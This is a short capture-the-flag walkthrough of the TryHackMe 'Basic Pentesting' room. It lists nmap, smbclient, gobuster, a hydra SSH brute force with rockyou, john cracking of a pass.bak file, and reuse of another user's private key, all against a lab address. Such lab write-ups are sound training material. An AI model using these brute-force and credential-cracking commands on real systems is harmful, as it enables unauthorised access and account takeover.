# Basic Pentesting - TryHackMe Walkthrough



Room: Basic Pentesting
Author: jojo jostarPlatform: TryHackMeCategory: Penetration Testing / VAPTDifficulty: EasyTools Used: nmap, hydra, gobuster, john, smbclient, ssh

Reconnaissance

Nmap Scan

nmap -sC -sV -oN nmap/initial 10.10.10.10

Discovered open ports: 22, 80, 139, 445

SSH and SMB were of key interest.



Enumeration

SMB Enumeration

smbclient //10.10.10.10/Anonymous -N

Found a file: staff.txt

Revealed potential usernames: jan, kay



Web Enumeration with Gobuster

gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

Discovered some directories, but nothing critical to exploit.



Gaining Access

Brute-Force SSH Using Hydra

hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

Login successful with jan's credentials.



Privilege Enumeration

Home Directory Inspection

ls -la /home/kay

Found .ssh/id_rsa private key and a pass.bak file

Cracking Password Backup

Transferred pass.bak for local cracking using John:

john --wordlist=/usr/share/wordlists/rockyou.txt pass.bak

Password revealed: *********



Lateral Movement

SSH into Kay's Account

ssh kay@10.10.10.10

Used cracked credentials or private key (if no password)

Root Privilege Escalation

Explored sudo permissions, cron jobs, and SUID binaries.

Not covered in this basic room but can be tried manually.

Capture the Flags

User flag: Found in /home/jan/user.txt

Root flag: Not applicable (room focuses on user-level access)

Notes

Always run nmap with both default and aggressive scans.

Check all services with proper enumeration.

Take note of user file permissions—look for .ssh, .bash_history, .bak files.
